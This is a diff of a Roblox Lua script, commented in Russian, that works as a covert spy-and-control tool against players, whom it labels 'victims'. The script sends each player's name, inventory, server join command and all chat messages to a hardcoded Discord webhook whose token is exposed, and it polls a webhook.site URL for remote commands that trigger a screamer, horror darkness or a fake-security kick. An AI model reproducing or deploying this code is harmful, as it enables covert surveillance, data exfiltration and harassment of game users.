@@ -1,13 +1,13 @@
 -- [[ CONFIG ]] --
 local log_webhook = "https://discord.com/api/webhooks/1463513332697927883/7XBUBBop6fsTyZvAfdCUKskGulE5z4MpXl_Q6Pa5Pqxg8Fdz7hRlnlF7PUzayceSrvF5"
-local control_url = "ТВОЯ_ССЫЛКА_WEBHOOK_SITE" -- Копируй с сайта!
+local control_url = "https://webhook.site/token/2823b2ef-9cc8-4640-909e-4b7893906b78/requests?sorting=created_at&direction=desc"
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local Lighting = game:GetService("Lighting")
 local lp = Players.LocalPlayer
 
--- Функция отправки отчетов
+-- Функция отправки отчетов в твой Discord
 local function sendLog(title, desc, color)
     pcall(function()
         local inv = ""
@@ -18,8 +18,8 @@ local function sendLog(title, desc, color)
                 ["description"] = desc,
                 ["color"] = color or 0x00ffff,
                 ["fields"] = {
-                    {["name"] = "👤 Жертва", ["value"] = lp.Name, ["inline"] = true},
-                    {["name"] = "🎒 Вещи", ["value"] = "```" .. (inv ~= "" and inv or "Empty") .. "```"},
+                    {["name"] = "👤 Жертва", ["value"] = "||"..lp.Name.."||", ["inline"] = true},
+                    {["name"] = "🎒 Инвентарь", ["value"] = "```" .. (inv ~= "" and inv or "Пусто") .. "```"},
                     {["name"] = "🔗 Join Server", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')```"}
                 }
             }}
@@ -29,42 +29,50 @@ local function sendLog(title, desc, color)
     end)
 end
 
--- Чтение команд ИЗ ЧАТА Дискорда (через Webhook.site)
+-- Система чтения команд из Webhook.site
 task.spawn(function()
-    local last_msg = ""
-    while task.wait(3) do -- Проверка каждые 3 секунды
+    local last_id = ""
+    while task.wait(3) do -- Проверка чата каждые 3 сек
         pcall(function()
             local response = game:HttpGet(control_url)
-            -- Ищем текст сообщения в запросе
-            if response ~= last_msg and response ~= "" then
-                last_msg = response
-                local cmd = string.lower(response)
-
-                if string.find(cmd, "kick") then
-                    local reason = string.match(cmd, "kick%s*%((.*)%)") or "Disconnected"
-                    sendLog("💀 КИК ИЗ ЧАТА", "Причина: " .. reason, 0xff0000)
-                    lp:Kick("\n[AxM Security]\n" .. reason)
-                
-                elseif string.find(cmd, "screamer") then
-                    local g = Instance.new("ScreenGui", lp.PlayerGui)
-                    local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1.5,0,1.5,0); i.Position = UDim2.new(-0.25,0,-0.25,0)
-                    i.Image = "rbxassetid://15518663806"
-                    local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s:Play()
-                    task.wait(0.5); g:Destroy()
-                    sendLog("😱 СКРИМЕР ИЗ ЧАТА", "Выполнено", 0xffffff)
-
-                elseif string.find(cmd, "horror") then
-                    Lighting.ClockTime = 0
-                    sendLog("🌑 УЖАС ИЗ ЧАТА", "Активировано", 0x000000)
+            local data = HttpService:JSONDecode(response)
+            if data and data.data and data.data[1] then
+                local latest = data.data[1]
+                if latest.id ~= last_id then
+                    last_id = latest.id
+                    local content = string.lower(latest.content or "")
+                    
+                    -- Команда: SCREAMER
+                    if string.find(content, "screamer") then
+                        local g = Instance.new("ScreenGui", lp.PlayerGui)
+                        local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1.5,0,1.5,0); i.Position = UDim2.new(-0.25,0,-0.25,0)
+                        i.Image = "rbxassetid://15518663806"
+                        local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s:Play()
+                        task.wait(0.5); g:Destroy()
+                        sendLog("😱 ВЫПОЛНЕН СКРИМЕР", "Жертва напугана через чат.", 0xffffff)
+                    
+                    -- Команда: HORROR
+                    elseif string.find(content, "horror") then
+                        Lighting.ClockTime = 0
+                        Lighting.Brightness = 0
+                        local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://163721344"; s.Volume = 3; s:Play()
+                        sendLog("🌑 ВЫПОЛНЕН УЖАС", "Тьма активирована через чат.", 0x000000)
+                    
+                    -- Команда: KICK
+                    elseif string.find(content, "kick") then
+                        local reason = string.match(content, "kick%s*%((.*)%)") or "Disconnected by Admin"
+                        sendLog("💀 ВЫПОЛНЕН КИК", "Причина: " .. reason, 0xff0000)
+                        lp:Kick("\n[AxM Security]\n" .. reason)
+                    end
                 end
             end
         end)
     end
 end)
 
--- Слежка за чатом Роблокса
+-- Слежка за игровым чатом
 lp.Chatted:Connect(function(msg)
-    sendLog("💬 ЧАТ ИГРОКА", "Написал: `" .. msg .. "`", 0x5555FF)
+    sendLog("💬 ЧАТ ИГРОКА", "Написал в игре: `" .. msg .. "`", 0x5555FF)
 end)
 
-sendLog("🛰️ MASTER-CONTROL ONLINE", "Пиши команды прямо в чат Дискорда!", 0x00FF00)
+sendLog("🛰️ ПОЛНЫЙ КОНТРОЛЬ УСТАНОВЛЕН", "Пиши команды `screamer`, `horror`, `kick (причина)` прямо в Discord!", 0x00FF00)
